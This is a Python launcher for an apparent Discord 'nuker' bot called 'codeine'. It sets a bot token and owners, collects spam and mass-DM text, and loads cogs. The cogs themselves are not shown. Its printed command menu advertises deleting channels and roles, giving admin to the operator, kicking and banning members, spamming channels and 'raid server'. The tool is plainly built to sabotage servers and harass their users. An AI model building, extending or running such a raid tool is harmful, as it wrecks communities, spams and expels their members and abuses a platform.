"""Main file"""

# Local libraries
from fileinput import filename
import os, sys

# Utils
from utils import (
    read_token,
    read_owners,
    input_token,
    input_owners,
    input_data
)

# Discord
import discord
from discord.ext import commands


def main():
    """Main function"""
    os.system("clear" if os.name == "posix" else "cls")
    choice = str(input("""
 ▄████▄   ▒█████  ▓█████▄ ▓█████  ██▓ ███▄    █ ▓█████ 
▒██▀ ▀█  ▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██▒ ██ ▀█   █ ▓█   ▀ 
▒▓█    ▄ ▒██░  ██▒░██   █▌▒███   ▒██▒▓██  ▀█ ██▒▒███   
▒▓▓▄ ▄██▒▒██   ██░░▓█▄   ▌▒▓█  ▄ ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
▒ ▓███▀ ░░ ████▓▒░░▒████▓ ░▒████▒░██░▒██░   ▓██░░▒████▒
░ ░▒ ▒  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░
  ░  ▒     ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░
░        ░ ░ ░ ▒   ░ ░  ░    ░    ▒ ░   ░   ░ ░    ░   
░ ░          ░ ░     ░       ░  ░ ░           ░    ░  ░
░                  ░                                   
Welcome to the codeine project, please choose any option
          
[1] Set owners
[2] Set the bot token
[3] See owners ids
[4] Custom the data of the bot
[5] Run the bot
[E] Exit

Select an option: """))
    
    if choice == '1':
        multiple_owners = str(input('You want to insert multiple owners? (Yes: Y) (No: N)')).lower()
        if multiple_owners == 'y':
            num = int(input('What num of owners you want to add?: '))
            input_owners(user_id=None, multiple_owners=num)
            main()
        elif multiple_owners == 'n':
            id = int(input('What is the user id?: '))
            input_owners(user_id=id, multiple_owners=None)
            main()
    elif choice == '2':
        token = str(input('Insert your bot token: '))
        input_token(token=token)
        main()
    elif choice == '3':
        owners = read_owners()
        for _ in owners:
            print(_)
        input('Press any key for continue')
        main()
    elif choice == '4':
        guild = str(input('Insert the new name of the guild: '))
        channel = str(input('Insert the name of the new channels: '))
        category = str(input('Insert the name of the new categories: '))
        emoji = str(input('Insert the name of the new emojis: '))
        admin = str(input('Insert the name of the admin role: '))
        dm = str(input('Insert the message to send to the dm of the members: '))
        nick = str(input('Insert the new nick of the members of the guild: '))
        rolename = str(input('Insert the name of the new roles: '))
        spam = str(input('Input the message to spam: '))
        
        input_data(elements=[guild, channel, category, emoji, admin, dm, nick, rolename, spam])
        main()
    elif choice == '5':
        cogs()
    elif choice == 'E':
        sys.exit(1)
    else:
        print('No valid choice')
        
def cogs():
    """This function loads and unloads the cogs"""
    client = commands.Bot(command_prefix='?', intents=discord.Intents.all())
    
    print("""
 ▄████▄   ▒█████  ▓█████▄ ▓█████  ██▓ ███▄    █ ▓█████ 
▒██▀ ▀█  ▒██▒  ██▒▒██▀ ██▌▓█   ▀ ▓██▒ ██ ▀█   █ ▓█   ▀ 
▒▓█    ▄ ▒██░  ██▒░██   █▌▒███   ▒██▒▓██  ▀█ ██▒▒███   
▒▓▓▄ ▄██▒▒██   ██░░▓█▄   ▌▒▓█  ▄ ░██░▓██▒  ▐▌██▒▒▓█  ▄ 
▒ ▓███▀ ░░ ████▓▒░░▒████▓ ░▒████▒░██░▒██░   ▓██░░▒████▒
░ ░▒ ▒  ░░ ▒░▒░▒░  ▒▒▓  ▒ ░░ ▒░ ░░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░
  ░  ▒     ░ ▒ ▒░  ░ ▒  ▒  ░ ░  ░ ▒ ░░ ░░   ░ ▒░ ░ ░  ░
░        ░ ░ ░ ▒   ░ ░  ░    ░    ▒ ░   ░   ░ ░    ░   
░ ░          ░ ░     ░       ░  ░ ░           ░    ░  ░
░                  ░                                   
Bot commands:
[1]Create channels - create_channels       [2]Delete channels - delete_channels       [3]Create categories - create_categories
[4]Create roles - create_roles             [5]Delete roles - delete_roles             [6]Send direct messages - send_dm
[7]Create emojis - create_emojis           [8]Delete emojis - delete_emojis           [9]Change guild name - change_name
[10]Change members nicks - change_nicks    [11]Give admin to you - give_admin         [12]Kick members - kick
[13]Ban members - ban                      [14]Spam channels - spam                   [15]Raid server - raid
          """)
    @client.command()
    async def load_cogs(ctx, extension):
        client.load_extension(f'cogs.{extension}')


    @client.command()
    async def unload_cogs(ctx, extension):
        client.unload_extension(f'cogs.{extension}')
        
        
    for filename in os.listdir('./cogs'):
        if filename.endswith('.py'):
            client.load_extension(f'cogs.{filename[:-3]}')
        
    try:
        client.run(read_token())
    except:
        print('Invalid token')


if __name__ == '__main__':
    main()